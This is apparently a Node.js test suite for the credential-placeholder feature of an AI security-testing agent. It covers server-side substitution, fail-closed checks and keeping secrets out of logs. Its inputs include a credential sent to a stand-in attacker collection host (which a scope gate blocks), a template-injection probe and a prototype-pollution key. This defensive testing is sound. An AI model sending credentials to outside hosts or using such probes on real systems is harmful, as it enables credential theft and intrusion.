"use strict";

// Server-side credential placeholders for bob_http_scan bodies.
//
// The gap these close: an auth profile could only ever be applied as HEADERS, and
// bob_list_auth_profiles redacts credential values on purpose, so no password /
// refresh_token / client_secret could reach a request BODY. Bob could replay a session but
// never obtain one — no form login, no JSON login, no OAuth grant exchange, no re-auth of an
// expired session, and no test of the auth endpoints themselves.
//
// The properties under test: (1) the agent NAMES a credential and the server SENDS the real
// value, so a login / refresh / re-auth actually works; (2) resolution FAILS CLOSED — an
// unknown profile or field, a blank credential, a malformed placeholder, or a placeholder
// outside the body sends nothing at all; (3) responses reach the agent VERBATIM, because Bob
// runs against the operator's own test accounts and needs real agency, and because splicing
// redaction markers into response text corrupted the machine consumers downstream; (4) PERSISTED
// artifacts (http-audit.jsonl, frontier-events.jsonl) carry only the placeholder LABEL, so a
// credential never rides along in an exported report or a shared session bundle.

const test = require("node:test");
const assert = require("node:assert/strict");
const dns = require("node:dns");
const fs = require("node:fs");
const http = require("node:http");
const os = require("node:os");
const path = require("node:path");

const { executeTool } = require("../mcp/lib/dispatch.js");
const { authStore, listAuthProfiles } = require("../mcp/lib/auth.js");
const { initSession } = require("../mcp/lib/session-state.js");
const { httpAuditJsonlPath, sessionDir } = require("../mcp/lib/paths.js");
const { makeCredentialRedactor } = require("../mcp/lib/auth-placeholders.js");

const PASSWORD = "Pa55w0rd-With-Sp@ce & \"quote\"";
const EMAIL = "victim-under-test@example.test";
const REFRESH_TOKEN = "rt_9f8e7d6c5b4a3-REFRESH";
// URL-safe (no quoting/escaping to confuse the check): it is echoed through a redirect
// Location and must never reach frontier-events.jsonl or http-audit.jsonl.
const REDIRECT_SECRET = "FinalUrlSecret4242";

function withTempHome(fn) {
  const previousHome = process.env.HOME;
  const home = fs.mkdtempSync(path.join(os.tmpdir(), "bob-cred-placeholder-"));
  process.env.HOME = home;
  return Promise.resolve()
    .then(() => fn(home))
    .finally(() => {
      if (previousHome === undefined) delete process.env.HOME;
      else process.env.HOME = previousHome;
      fs.rmSync(home, { recursive: true, force: true });
    });
}

function withDnsHost(host, fn) {
  const originalLookup = dns.lookup;
  dns.lookup = function lookup(hostname, options, callback) {
    if (hostname === host) {
      const cb = typeof options === "function" ? options : callback;
      const opts = typeof options === "object" && options != null ? options : {};
      if (opts.all) cb(null, [{ address: "127.0.0.1", family: 4 }]);
      else cb(null, "127.0.0.1", 4);
      return;
    }
    return originalLookup.call(dns, hostname, options, callback);
  };
  return Promise.resolve()
    .then(fn)
    .finally(() => {
      dns.lookup = originalLookup;
    });
}

function withFixtureServer(handler, fn) {
  const requests = [];
  const server = http.createServer((req, res) => {
    const chunks = [];
    req.on("data", (chunk) => chunks.push(chunk));
    req.on("end", () => {
      const body = Buffer.concat(chunks);
      requests.push({ method: req.method, url: req.url, headers: req.headers, body: body.toString("utf8") });
      handler(req, res, body.toString("utf8"));
    });
  });
  return new Promise((resolve, reject) => {
    server.on("error", reject);
    server.listen(0, "127.0.0.1", () => {
      Promise.resolve()
        .then(() => fn(server.address().port, requests))
        .then(resolve, reject)
        .finally(() => { server.close(); });
    });
  });
}

function seedSessionWithCredentials(domain, port, credentials = { email: EMAIL, password: PASSWORD }) {
  JSON.parse(initSession({ target_domain: domain, target_url: `http://${domain}:${port}/` }));
  authStore({ target_domain: domain, profile_name: "victim", credentials });
}

function auditBlob(domain) {
  const auditPath = httpAuditJsonlPath(domain);
  if (!fs.existsSync(auditPath)) return "";
  return fs.readFileSync(auditPath, "utf8");
}

function auditRecords(domain) {
  return auditBlob(domain).trim().split("\n").filter(Boolean).map((line) => JSON.parse(line));
}

function jsonOk(res, payload) {
  res.writeHead(200, { "content-type": "application/json" });
  res.end(JSON.stringify(payload));
}

function frontierEventsBlob(domain) {
  const eventsPath = path.join(sessionDir(domain), "frontier-events.jsonl");
  if (!fs.existsSync(eventsPath)) return "";
  return fs.readFileSync(eventsPath, "utf8");
}

function frontierEvents(domain) {
  return frontierEventsBlob(domain).trim().split("\n").filter(Boolean).map((line) => JSON.parse(line));
}

// A CRUD store: one writable-then-readable field, no reflection in the write response. This
// is the minimum a target has to offer for the two-call laundering path — a bio, a display
// name, a note, a comment, a ticket title.
function storeAndReadServer(state) {
  return (req, res, body) => {
    if (req.method === "POST") {
      state.bio = JSON.parse(body).bio;
      jsonOk(res, { ok: true, saved: true });
      return;
    }
    jsonOk(res, { bio: state.bio ?? null });
  };
}

// ── Encoder shapes real template engines emit that htmlEscape/secretVariants do NOT ────────
// markupsafe / Jinja2 / Flask: numeric-decimal for the quote characters.
function markupsafeEscape(value) {
  return String(value)
    .replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")
    .replace(/"/g, "&#34;").replace(/'/g, "&#39;");
}

// Django's django.utils.html.escape: numeric-HEX for the apostrophe.
function djangoEscape(value) {
  return String(value)
    .replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;").replace(/'/g, "&#x27;");
}

function decimalEntities(value) {
  return Array.from(String(value)).map((ch) => `&#${ch.codePointAt(0)};`).join("");
}

// Python json.dumps default (ensure_ascii=True): every non-ASCII char becomes \uXXXX.
// Returns the QUOTED JSON literal, exactly as it appears on the wire.
function ensureAsciiJson(value) {
  return JSON.stringify(String(value))
    .replace(/[^\u0000-\u007f]/g, (ch) => `\\u${ch.charCodeAt(0).toString(16).padStart(4, "0")}`);
}

// Drop every mcp/ module from the require cache so the next require rebuilds the whole graph
// from disk. Proves a behaviour is a property of the persisted auth STORE rather than of any
// in-memory memory of what a previous call substituted.
function purgeMcpModuleCache() {
  const mcpRoot = path.resolve(__dirname, "..", "mcp") + path.sep;
  for (const key of Object.keys(require.cache)) {
    if (key.startsWith(mcpRoot)) delete require.cache[key];
  }
}

test("JSON object body: the placeholder is substituted server-side, the login succeeds, and the secret never returns", () =>
  withTempHome(() => withFixtureServer((req, res, body) => {
    const parsed = JSON.parse(body);
    if (parsed.email === EMAIL && parsed.password === PASSWORD) {
      jsonOk(res, { token: "session-token-abc", ok: true });
      return;
    }
    res.writeHead(401, { "content-type": "application/json" });
    res.end(JSON.stringify({ error: "bad credentials" }));
  }, (port, requests) => {
    const domain = "cred-json-login.example.test";
    return withDnsHost(domain, async () => {
      seedSessionWithCredentials(domain, port);

      const envelope = await executeTool("bob_http_scan", {
        target_domain: domain,
        method: "POST",
        url: `http://${domain}:${port}/api/login`,
        body: { email: "{{auth.victim.email}}", password: "{{auth.victim.password}}" },
      });

      assert.equal(envelope.ok, true, JSON.stringify(envelope.error || {}));
      assert.equal(envelope.data.status, 200, "the real credential must have reached the target");
      assert.match(envelope.data.body, /session-token-abc/);

      // The wire carried the REAL values, JSON-escaped correctly despite the quote in the
      // password, and no literal placeholder text.
      assert.equal(requests.length, 1);
      assert.equal(JSON.parse(requests[0].body).password, PASSWORD);
      assert.equal(requests[0].headers["content-type"], "application/json");
      assert.ok(!requests[0].body.includes("{{auth."), "no literal placeholder may reach the target");

      // Nothing the agent receives carries the secret.
      const returned = JSON.stringify(envelope);
      assert.ok(!returned.includes(PASSWORD), "the tool payload must never carry the password");
      assert.ok(!returned.includes(EMAIL), "the tool payload must never carry the email credential");
    });
  })));

test("form-encoded body: placeholders substitute with percent-encoding and the server decodes the real credential", () =>
  withTempHome(() => withFixtureServer((req, res, body) => {
    const params = new URLSearchParams(body);
    if (params.get("grant_type") === "refresh_token" && params.get("refresh_token") === REFRESH_TOKEN
      && params.get("password") === PASSWORD) {
      jsonOk(res, { access_token: "at_new", ok: true });
      return;
    }
    res.writeHead(400, { "content-type": "application/json" });
    res.end(JSON.stringify({ error: "invalid_grant", got: body }));
  }, (port, requests) => {
    const domain = "cred-form-login.example.test";
    return withDnsHost(domain, async () => {
      seedSessionWithCredentials(domain, port, {
        email: EMAIL,
        password: PASSWORD,
        refresh_token: REFRESH_TOKEN,
      });

      const envelope = await executeTool("bob_http_scan", {
        target_domain: domain,
        method: "POST",
        url: `http://${domain}:${port}/oauth/token`,
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: "grant_type=refresh_token&refresh_token={{auth.victim.refresh_token}}&password={{auth.victim.password}}",
      });

      assert.equal(envelope.ok, true, JSON.stringify(envelope.error || {}));
      assert.equal(envelope.data.status, 200, `form substitution failed: ${envelope.data.body}`);
      // The raw wire bytes are percent-encoded, so the '&' and space in the password cannot
      // split the form into extra parameters.
      assert.ok(!requests[0].body.includes(PASSWORD), "a raw credential must not be injected unencoded into a form");
      assert.equal(new URLSearchParams(requests[0].body).get("password"), PASSWORD);
      const returned = JSON.stringify(envelope);
      assert.ok(!returned.includes(PASSWORD));
      assert.ok(!returned.includes(REFRESH_TOKEN));
    });
  })));

test("nested JSON values substitute, a caller-set Content-Length is corrected, and a __proto__ probe key survives", () =>
  withTempHome(() => withFixtureServer((req, res, body) => {
    const parsed = JSON.parse(body);
    if (parsed.auth && parsed.auth.identity && parsed.auth.identity.secret === PASSWORD) {
      jsonOk(res, { ok: true });
      return;
    }
    res.writeHead(422, { "content-type": "application/json" });
    res.end(JSON.stringify({ error: "nested substitution failed" }));
  }, (port, requests) => {
    const domain = "cred-nested-json.example.test";
    return withDnsHost(domain, async () => {
      seedSessionWithCredentials(domain, port);

      const envelope = await executeTool("bob_http_scan", {
        target_domain: domain,
        method: "POST",
        url: `http://${domain}:${port}/api/session`,
        // Content-Length was measured against the TEMPLATE; a stale value would truncate or
        // hang the request and read as a target-side failure.
        headers: { "Content-Type": "application/json", "Content-Length": "17" },
        // Built via JSON.parse, exactly as an MCP request body arrives: "__proto__" is then an
        // OWN property, which a naive rebuild into a plain {} would silently swallow.
        body: JSON.parse(JSON.stringify({
          auth: { identity: { secret: "{{auth.victim.password}}", note: "for {{auth.victim.email}}" } },
        }).replace(/^\{/, '{"__proto__":{"polluted":true},')),
      });

      assert.equal(envelope.ok, true, JSON.stringify(envelope.error || {}));
      assert.equal(envelope.data.status, 200, `nested substitution failed: ${envelope.data.body}`);
      const sent = JSON.parse(requests[0].body);
      assert.equal(sent.auth.identity.secret, PASSWORD);
      assert.equal(sent.auth.identity.note, `for ${EMAIL}`);
      assert.ok(
        requests[0].body.includes('"__proto__":{"polluted":true}'),
        `a prototype-pollution probe key must reach the target intact: ${requests[0].body}`,
      );
      assert.equal(Number(requests[0].headers["content-length"]), Buffer.byteLength(requests[0].body));
      assert.ok(!JSON.stringify(envelope).includes(PASSWORD));
    });
  })));

test("agent-visible responses are VERBATIM (login agency) while persisted artifacts keep only the label", () =>
  withTempHome(() => withFixtureServer((req, res, body) => {
    const parsed = JSON.parse(body);
    // Three reflection shapes at once: verbatim in the body, HTML-escaped (a rendered
    // profile bio), percent-encoded (a redirect-ish echo), and a header echo.
    res.writeHead(200, {
      "content-type": "application/json",
      "x-echo-bio": parsed.bio,
    });
    res.end(JSON.stringify({
      verbatim: parsed.bio,
      html: String(parsed.bio).replace(/&/g, "&amp;").replace(/"/g, "&quot;"),
      encoded: encodeURIComponent(parsed.bio),
      validation_error: `value "${parsed.bio}" is not allowed`,
    }));
  }, (port, requests) => {
    const domain = "cred-echoback.example.test";
    return withDnsHost(domain, async () => {
      seedSessionWithCredentials(domain, port);

      const envelope = await executeTool("bob_http_scan", {
        target_domain: domain,
        method: "POST",
        url: `http://${domain}:${port}/api/profile`,
        body: { bio: "{{auth.victim.password}}" },
      });

      assert.equal(envelope.ok, true, JSON.stringify(envelope.error || {}));
      assert.equal(envelope.data.status, 200);
      // The target really did receive the plaintext credential.
      assert.equal(JSON.parse(requests[0].body).bio, PASSWORD);

      // OPERATOR POLICY: the agent sees the response VERBATIM. Bob runs against the operator's
      // own test accounts and needs real agency to log in, refresh a token, and reason about the
      // reply. Redacting the agent's view was never soundly closable (the basis lives in an
      // agent-writable store and every other target-touching tool returns text raw) and it
      // actively corrupted evidence, so it is deliberately not attempted.
      const returned = JSON.stringify(envelope);
      assert.ok(!returned.includes("REDACTED_CREDENTIAL"),
        "no redaction marker may be spliced into agent-visible response content");
      // The percent-encoded echo carries no quote, so it survives JSON.stringify intact and is
      // a sound literal probe that the plaintext really reached the agent.
      assert.ok(returned.includes(encodeURIComponent(PASSWORD)),
        "the agent must receive the response verbatim");

      // EVIDENCE FIDELITY (the load-bearing property): the body is byte-faithful, so it still
      // parses and the machine consumers downstream — differential comparators, body-shape and
      // sensitive-field projections, endpoint discovery — see exactly what the target sent.
      // Marker-splicing previously made bodies unparseable, which flipped a real cross-tenant
      // IDOR read from "inconclusive" to "denied" and mutated the audit-graded results_hash.
      const parsedBody = JSON.parse(envelope.data.body);
      assert.equal(parsedBody.verbatim, PASSWORD);
      assert.equal(parsedBody.encoded, encodeURIComponent(PASSWORD));

      // PERSISTED artifacts still hold the LABEL, never the value: a credential must not ride
      // along in an exported report or a shared session bundle.
      const blob = auditBlob(domain);
      assert.ok(!blob.includes(PASSWORD), `http-audit.jsonl leaked the credential: ${blob}`);
      const allowed = auditRecords(domain).filter((record) => record.scope_decision === "allowed");
      assert.deepEqual(allowed[0].credential_placeholders, ["auth.victim.password"]);
    });
  })));

test("truncated response: a partial credential left by the transport cap is redacted too", () => {
  const redactor = makeCredentialRedactor([
    { label: "auth.victim.password", profile: "victim", field: "password", value: "SuperSecretValue123" },
  ]);
  // The response was cut mid-credential, so exact matching sees nothing.
  const cut = "...reflected bio: SuperSecretVal";
  assert.ok(redactor.text(cut).includes("SuperSecretVal"), "premise: exact redaction alone cannot see the cut prefix");
  const guarded = redactor.truncatedTail(cut);
  assert.ok(!guarded.includes("SuperSecretVal"), `partial credential survived truncation: ${guarded}`);
  assert.ok(guarded.includes("REDACTED_CREDENTIAL:auth.victim.password"));
});

test("fail closed: an unknown profile refuses and sends nothing", () =>
  withTempHome(() => withFixtureServer((req, res) => jsonOk(res, { ok: true }), (port, requests) => {
    const domain = "cred-unknown-profile.example.test";
    return withDnsHost(domain, async () => {
      seedSessionWithCredentials(domain, port);
      const envelope = await executeTool("bob_http_scan", {
        target_domain: domain,
        method: "POST",
        url: `http://${domain}:${port}/api/login`,
        body: { password: "{{auth.ghost.password}}" },
      });
      assert.equal(envelope.ok, false);
      assert.match(JSON.stringify(envelope), /does not exist for/);
      assert.equal(requests.length, 0, "no request may be sent when a placeholder cannot resolve");
      const records = auditRecords(domain);
      assert.equal(records[0].scope_decision, "credential_unresolved");
    });
  })));

test("fail closed: an unknown credential field refuses, names the available fields, and reveals no value", () =>
  withTempHome(() => withFixtureServer((req, res) => jsonOk(res, { ok: true }), (port, requests) => {
    const domain = "cred-unknown-field.example.test";
    return withDnsHost(domain, async () => {
      seedSessionWithCredentials(domain, port);
      const envelope = await executeTool("bob_http_scan", {
        target_domain: domain,
        method: "POST",
        url: `http://${domain}:${port}/api/login`,
        body: { secret: "{{auth.victim.client_secret}}" },
      });
      assert.equal(envelope.ok, false);
      const blob = JSON.stringify(envelope);
      assert.match(blob, /does not carry/);
      assert.match(blob, /email, password/);
      assert.ok(!blob.includes(PASSWORD), "the fail-closed message must not leak a value");
      assert.equal(requests.length, 0);
    });
  })));

test("fail closed: an empty credential refuses rather than sending an empty string", () =>
  withTempHome(() => withFixtureServer((req, res) => jsonOk(res, { ok: true }), (port, requests) => {
    const domain = "cred-empty-value.example.test";
    return withDnsHost(domain, async () => {
      seedSessionWithCredentials(domain, port, { email: EMAIL, password: "   " });
      const envelope = await executeTool("bob_http_scan", {
        target_domain: domain,
        method: "POST",
        url: `http://${domain}:${port}/api/login`,
        body: { password: "{{auth.victim.password}}" },
      });
      assert.equal(envelope.ok, false);
      assert.match(JSON.stringify(envelope), /empty credential/);
      assert.equal(requests.length, 0);
    });
  })));

test("fail closed: a malformed placeholder refuses instead of sending the literal template text", () =>
  withTempHome(() => withFixtureServer((req, res) => jsonOk(res, { ok: true }), (port, requests) => {
    const domain = "cred-malformed.example.test";
    return withDnsHost(domain, async () => {
      seedSessionWithCredentials(domain, port);
      const envelope = await executeTool("bob_http_scan", {
        target_domain: domain,
        method: "POST",
        url: `http://${domain}:${port}/api/login`,
        body: { password: "{{auth.victim.creds.password}}" },
      });
      assert.equal(envelope.ok, false);
      assert.match(JSON.stringify(envelope), /malformed credential placeholder/);
      assert.equal(requests.length, 0);
    });
  })));

test("a non-auth mustache payload (template injection probe) is untouched and still sent", () =>
  withTempHome(() => withFixtureServer((req, res, body) => jsonOk(res, { got: JSON.parse(body).q }), (port, requests) => {
    const domain = "cred-ssti-passthrough.example.test";
    return withDnsHost(domain, async () => {
      seedSessionWithCredentials(domain, port);
      const envelope = await executeTool("bob_http_scan", {
        target_domain: domain,
        method: "POST",
        url: `http://${domain}:${port}/api/search`,
        body: { q: "{{7*7}}" },
      });
      assert.equal(envelope.ok, true, JSON.stringify(envelope.error || {}));
      assert.equal(JSON.parse(requests[0].body).q, "{{7*7}}");
    });
  })));

test("placeholders outside the body are refused (URL and headers), so a credential cannot land in a log or an access log", () =>
  withTempHome(() => withFixtureServer((req, res) => jsonOk(res, { ok: true }), (port, requests) => {
    const domain = "cred-misplaced.example.test";
    return withDnsHost(domain, async () => {
      seedSessionWithCredentials(domain, port);

      const inUrl = await executeTool("bob_http_scan", {
        target_domain: domain,
        method: "GET",
        url: `http://${domain}:${port}/api/login?p={{auth.victim.password}}`,
      });
      assert.equal(inUrl.ok, false);
      assert.match(JSON.stringify(inUrl), /request BODY only/);

      const inHeader = await executeTool("bob_http_scan", {
        target_domain: domain,
        method: "POST",
        url: `http://${domain}:${port}/api/login`,
        headers: { "X-Password": "{{auth.victim.password}}" },
        body: "{}",
      });
      assert.equal(inHeader.ok, false);
      assert.match(JSON.stringify(inHeader), /request BODY only/);

      assert.equal(requests.length, 0);
      assert.ok(!auditBlob(domain).includes(PASSWORD));
    });
  })));

test("SCOPE GATE: an out-of-scope target with a credential placeholder is blocked and the credential is never resolved", () =>
  withTempHome(() => withFixtureServer((req, res) => jsonOk(res, { ok: true }), (port, requests) => {
    const domain = "cred-scope-gate.example.test";
    return withDnsHost(domain, async () => {
      seedSessionWithCredentials(domain, port);
      const envelope = await executeTool("bob_http_scan", {
        target_domain: domain,
        method: "POST",
        url: "https://attacker-collector.example.com/collect",
        body: { password: "{{auth.victim.password}}" },
      });
      assert.equal(envelope.ok, false);
      assert.equal(envelope.error.code, "SCOPE_BLOCKED");
      assert.equal(requests.length, 0);
      const blob = `${JSON.stringify(envelope)}${auditBlob(domain)}`;
      assert.ok(!blob.includes(PASSWORD), "an off-target request must never resolve a credential");
      assert.equal(auditRecords(domain)[0].scope_decision, "blocked");
    });
  })));

test("bob_list_auth_profiles is unchanged: field NAMES only, never values", () =>
  withTempHome(() => withFixtureServer((req, res) => jsonOk(res, { ok: true }), (port) => {
    const domain = "cred-list-profiles.example.test";
    return withDnsHost(domain, async () => {
      seedSessionWithCredentials(domain, port, { email: EMAIL, password: PASSWORD, refresh_token: REFRESH_TOKEN });
      const raw = listAuthProfiles({ target_domain: domain });
      assert.ok(!raw.includes(PASSWORD), "credential values must stay redacted");
      assert.ok(!raw.includes(REFRESH_TOKEN));
      assert.ok(!raw.includes(EMAIL));
      const parsed = JSON.parse(raw);
      const victim = parsed.profiles.find((profile) => profile.profile_name === "victim");
      assert.equal(victim.has_credentials, true);
      assert.deepEqual(victim.credential_fields, ["email", "password", "refresh_token"]);

      // Same through the agent-facing tool surface.
      const envelope = await executeTool("bob_list_auth_profiles", { target_domain: domain });
      assert.equal(envelope.ok, true);
      assert.ok(!JSON.stringify(envelope).includes(PASSWORD));
    });
  })));

test("a body with no placeholder is forwarded byte-for-byte (no reserialization, no injected content-type)", () =>
  withTempHome(() => withFixtureServer((req, res) => jsonOk(res, { ok: true }), (port, requests) => {
    const domain = "cred-passthrough.example.test";
    return withDnsHost(domain, async () => {
      seedSessionWithCredentials(domain, port);
      const literal = '{"a":   1,\n  "b": "two"}';
      const envelope = await executeTool("bob_http_scan", {
        target_domain: domain,
        method: "POST",
        url: `http://${domain}:${port}/api/echo`,
        body: literal,
      });
      assert.equal(envelope.ok, true, JSON.stringify(envelope.error || {}));
      assert.equal(requests[0].body, literal);
      assert.equal(requests[0].headers["content-type"], undefined);
      assert.deepEqual(auditRecords(domain)[0].credential_placeholders, []);
    });
  })));

// ── DEFECT 1: request-local redaction ──────────────────────────────────────────────────────
// The redactor used to be a function-local `let` armed only when THAT invocation substituted
// something. Redaction has to be a property of the DOMAIN, resolved from the auth store, or
// two ordinary calls launder the secret out.

test("PERSISTED LEAK: a redirect-echoed credential never lands in frontier-events.jsonl", () =>
  withTempHome(() => withFixtureServer((req, res, body) => {
    if (req.method === "POST") {
      const bio = JSON.parse(body).bio;
      // The classic post-then-redirect: the saved value comes back in the redirect target.
      res.writeHead(302, { location: `/openapi.json?echo=${encodeURIComponent(bio)}` });
      res.end();
      return;
    }
    jsonOk(res, {
      openapi: "3.0.0",
      info: { title: "Fixture", version: "1.0.0" },
      paths: { "/users": { get: { responses: { 200: { description: "ok" } } } } },
      components: { securitySchemes: { bearerAuth: { type: "http", scheme: "bearer" } } },
    });
  }, (port) => {
    const domain = "cred-final-url.example.test";
    return withDnsHost(domain, async () => {
      seedSessionWithCredentials(domain, port, { email: EMAIL, password: REDIRECT_SECRET });

      const envelope = await executeTool("bob_http_scan", {
        target_domain: domain,
        method: "POST",
        url: `http://${domain}:${port}/api/profile`,
        surface_id: "surface:final-url-echo",
        follow_redirects: true,
        body: { bio: "{{auth.victim.password}}" },
      });

      assert.equal(envelope.ok, true, JSON.stringify(envelope.error || {}));
      assert.equal(envelope.data.status, 200);
      assert.equal(envelope.data.redirected, true, "premise: the redirect was followed");

      const events = frontierEvents(domain).filter((event) => event.kind === "observation.recorded"
        && event.payload && event.payload.observation_kind === "openapi_schema_observed");
      assert.equal(events.length, 1, "premise: the schema observation writer ran on the redirected URL");
      assert.ok(
        events[0].payload.schema_url.includes("REDACTED_CREDENTIAL:auth.victim.password"),
        `schema_url must carry the marker, got ${events[0].payload.schema_url}`,
      );

      const blob = frontierEventsBlob(domain);
      assert.ok(!blob.includes(REDIRECT_SECRET), `frontier-events.jsonl leaked the credential: ${blob}`);
      // (the agent's own copy is verbatim by policy; the LEDGER is what must stay clean)
      assert.ok(!auditBlob(domain).includes(REDIRECT_SECRET));
    });
  })));
